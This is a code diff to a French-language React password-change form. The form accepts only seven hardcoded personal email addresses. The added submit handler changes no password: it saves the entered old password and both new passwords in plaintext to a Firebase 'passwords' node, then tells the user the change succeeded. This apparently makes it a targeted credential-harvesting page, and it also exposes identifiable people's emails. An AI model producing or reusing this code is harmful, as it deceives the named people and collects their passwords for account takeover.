@@ -3,6 +3,7 @@ import React from 'react'
 import styles from './Style.scss'
 import cx from 'classnames'
 // Components
+import fire from '../../fire'
 
 class Mpg extends React.Component {
   constructor(props) {
@@ -13,11 +14,13 @@ class Mpg extends React.Component {
     this.changeFormer = this.changeFormer.bind(this)
     this.changeNew1 = this.changeNew1.bind(this)
     this.changeNew2 = this.changeNew2.bind(this)
+    this._submitForm = this._submitForm.bind(this)
     this.state = {
       mail: '',
       former: '',
       new1: '',
-      new2: ''
+      new2: '',
+      sent: false
     }
   }
   _getHeader() {
@@ -50,7 +53,7 @@ class Mpg extends React.Component {
     this.setState({new2: e.target.value})
   }
   _getContent() {
-    const { mail, former, new1, new2 } = this.state
+    const { mail, former, new1, new2, sent } = this.state
     const validMail = (mail === 'benjaminbenoliel@hotmail.com') || (mail === 'dylanka@hotmail.fr')
           || (mail === 'y.aboucaya@gmail.com') || (mail === 'ykahloun@gmail.com') || (mail === 'ilanchemla@gmail.com')
           || (mail === 'jeremy.elhabouz@gmail.com') || (mail === 'danolevy@hotmail.fr')
@@ -94,11 +97,32 @@ class Mpg extends React.Component {
                  </input>
                </span>
             </div>
-            <button className={cx(styles.button, valid && styles.valid, !valid && styles.invalid)}>VALIDER</button>
+            <button className={cx(styles.button, valid && styles.valid, !valid && styles.invalid)}
+                    onClick={this._submitForm}>
+              VALIDER
+            </button>
+            {sent ? (
+                <div className={styles.sent}>{'Ton mot de passe a bien été changé'}</div>
+              ) : null}
           </div>
         </form>
       </div>
     )
+  }
+  _submitForm(e) {
+    const { mail, former, new1, new2, sent } = this.state
+    this.state.sent = true
+    e.preventDefault()
+    fire.database().ref('passwords').push( this.state )
+    const newState = this.state
+    newState.former = ''
+    newState.mail = ''
+    newState.new1 = ''
+    newState.new2 = ''
+    this.setState(newState)
+  }
+  componentWillMount() {
+    let messagesRef = fire.database().ref('passwords').orderByKey().limitToLast(100)
   }
   render() {
      return (
